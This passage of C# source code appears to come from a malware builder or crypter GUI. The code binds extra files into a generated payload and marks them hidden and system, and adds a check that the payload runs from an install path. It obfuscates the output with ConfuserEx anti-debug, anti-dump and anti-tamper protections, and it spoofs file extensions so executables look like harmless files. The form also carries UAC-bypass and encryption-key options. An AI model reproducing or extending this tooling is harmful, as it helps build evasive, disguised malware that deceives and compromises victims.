									if (HideFilesBinded.Checked == true)
									{
										newgj = newgj.Insert(index, Environment.NewLine + @"try{File.SetAttributes(sjnfnos + ""\\"" + """ + Path.GetFileName(iasjfd.SubItems[0].Text) + @""", File.GetAttributes(sjnfnos + ""\\"" + """ + Path.GetFileName(iasjfd.SubItems[0].Text) + @""") | FileAttributes.Hidden | FileAttributes.System); }catch{}");
									}
									newgj = newgj.Insert(index, Environment.NewLine + @"extract2idk(""" + Path.GetFileName(iasjfd.SubItems[0].Text) + @""", sjnfnos + ""\\"" + """ + Path.GetFileName(iasjfd.SubItems[0].Text) + @""", " + iasjfd.SubItems[1].Text + @", " + iasjfd.SubItems[2].Text + @");");
									if (HideFilesBinded.Checked == true)
									{
										newgj = newgj.Insert(index, Environment.NewLine + @"try{File.SetAttributes(sjnfnos + ""\\"" + """ + Path.GetFileName(iasjfd.SubItems[0].Text) + @""", FileAttributes.Normal); }catch{}");
									}
								}
								text = text.Replace("//insertbindmethods", newgj);
								text = text.Replace("//callbindmethodxd", @"if(System.Reflection.Assembly.GetEntryAssembly().Location != Environment.ExpandEnvironmentVariables(""[EnvironmentVarxd]"") + @""\"" + Path.GetFileName(System.Reflection.Assembly.GetEntryAssembly().Location)){ThisMethodxd();}");
							}
							if (CompileFromSource(text, text2))
							{
								

								string addr = @"
<project outputDir=""tempings"" baseDir=""mainkek"" xmlns=""http://confuser.codeplex.com"">
<rule pattern=""true"" preset=""guc"" inherit=""false"">
      <protection id=""anti debug"" />
      <protection id=""anti dump"" />
      <protection id=""anti ildasm"" />
      <protection id=""anti tamper"" />
      <protection id=""constants"" />
      <protection id=""ctrl flow"" />
      <protection id=""harden"" />
      <protection id=""invalid metadata"" />
      <protection id=""ref proxy"" />
      <protection id=""rename"" />
      <protection id=""watermark"" />
      <protection id=""typescramble"" />
      <protection id=""anti dump"" />
</rule>
<module path=""repme"" />
</project>";

                                try {
									string value = siticoneComboBox1.Text.ToLower();
									addr = addr.Replace("guc", value);
									addr = addr.Replace("repme", getname);
									addr = addr.Replace("tempings", Path.GetTempPath());
									addr = addr.Replace("mainkek", Path.GetTempPath() + "Obfuscation");

									File.WriteAllText($"{Path.GetTempPath()}\\Obfuscation\\cfg.crproj", addr);
									Process p = new Process();
									p.StartInfo.FileName = $"cmd.exe";
									p.StartInfo.Arguments = $"/c Confuser.CLI.exe cfg.crproj";
									p.StartInfo.WorkingDirectory = $"{Path.GetTempPath()}\\Obfuscation";
									p.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
									p.Start();
									p.WaitForExit();
									File.Move(Path.GetTempPath() + "\\" + getname, saveFileDialog.FileName);

									File.Delete(Path.GetTempPath() + "\\Obfuscation" + "\\" + getname);

									if (File.Exists(Path.GetTempPath() + "\\Obfuscation\\cfg.crproj"))
									{
										File.Delete(Path.GetTempPath() + "\\Obfuscation\\cfg.crproj");
									}
									if (Properties.Settings.Default.WriteAssembly)
									{
										if (WriteAssembly.Write(saveFileDialog.FileName))
										{
											Console.WriteLine("Changed Assembly !");
										}
									}
									if (spoofEx.Checked)
									{
										Console.WriteLine("changing extension spoofing");
										string filePath = Path.Combine(Path.GetTempPath() + "\\" + getname, saveFileDialog.FileName);
										File.Move(saveFileDialog.FileName, Tools.ExtensionSpoof.Spoof(filePath, spoofExtension.Text));

										Console.WriteLine($"SuccesFully Changed To {Path.GetFileNameWithoutExtension(saveFileDialog.FileName)}exe.{spoofExtension.Text}");

									}

									MessageBox.Show("Done! check your output directory", "Compiled!", MessageBoxButtons.OK, MessageBoxIcon.None, MessageBoxDefaultButton.Button1, (MessageBoxOptions)262144);
								}
                                catch (Exception se)
                                {
									Console.WriteLine(se);
                                }

							}
						}
					}
				}
				else
				{
					MessageBox.Show("Error!", "You left something blank.", MessageBoxButtons.OK, MessageBoxIcon.Information);
				}
			}
			catch (Exception se)
			{
				MessageBox.Show(se.ToString());
				MessageBox.Show("Error has occured while compiling.");
			}

		}

		private void siticoneButton1_Click(object sender, EventArgs e)
		{
			Application.Exit();
		}


		private void sleepDelay_ValueChanged(object sender, EventArgs e)
		{
		
		}

		private void siticoneButton3_Click(object sender, EventArgs e)
		{
			Forms.Assembly asm = new Forms.Assembly();
			asm.Show();

		}

        private void AddFilesToBind_Click(object sender, EventArgs e)
        {
			OpenFileDialog ofd = new OpenFileDialog();
			if (ofd.ShowDialog() == DialogResult.OK)
			{
				string[] itemsf = { ofd.FileName, "true", "false" };
				ListViewItem ajnisdfin = new ListViewItem(itemsf);
				listView1.Items.Add(ajnisdfin);
			}
			else
			{
				return;
			}
		}

        private void RemoveSelected_Click(object sender, EventArgs e)
        {
			if (listView1.Items.Count > 0)
			{
				listView1.SelectedItems[0].Remove();
			}
		}

        private void ToggleExe_Click(object sender, EventArgs e)
        {
			if (listView1.SelectedItems[0].SubItems[1].Text == "true")
			{
				listView1.SelectedItems[0].SubItems[1].Text = "false";
			}
			else if (listView1.SelectedItems[0].SubItems[1].Text == "false")
			{
				listView1.SelectedItems[0].SubItems[1].Text = "true";
			}
		}

        private void ToggleRunAsAdmin_Click(object sender, EventArgs e)
        {
			if (listView1.SelectedItems[0].SubItems[2].Text == "true")
			{
				listView1.SelectedItems[0].SubItems[2].Text = "false";
			}
			else if (listView1.SelectedItems[0].SubItems[2].Text == "false")
			{
				listView1.SelectedItems[0].SubItems[2].Text = "true";
			}
		}

    

        private void uacBypass_CheckedChanged(object sender, EventArgs e)
        {

        }

        private void genkeybut_Click(object sender, EventArgs e)
        {
			byte[] kek = StringCipher.Generate256BitsOfRandomEntropy();
			string enc = Convert.ToBase64String(kek);
			aeskeylol = enc;
			genkey.Text = aeskeylol;
		}

        private void Browser_Icon_Click(object sender, EventArgs e)
        {
			using (var openFileDialog = new OpenFileDialog())
			{
				openFileDialog.Filter = "Icon (*.ico)|*.ico";
				if (openFileDialog.ShowDialog() == DialogResult.OK)
				{
					icon_path.Text = openFileDialog.FileName;
			
				}
			}
		}

 
        private void spoofExtension_SelectedIndexChanged(object sender, EventArgs e)
        {
			if (!spoofEx.Checked)
            {
				MessageBox.Show("Please Enable First !");
            }	
        }

        private void spoofEx_CheckedChanged(object sender, EventArgs e)
        {
			MessageBox.Show("This Option is not Recommend !");
		}

        private void siticoneButton2_Click(object sender, EventArgs e)
        {
			this.WindowState = FormWindowState.Minimized;
        }
    }
}

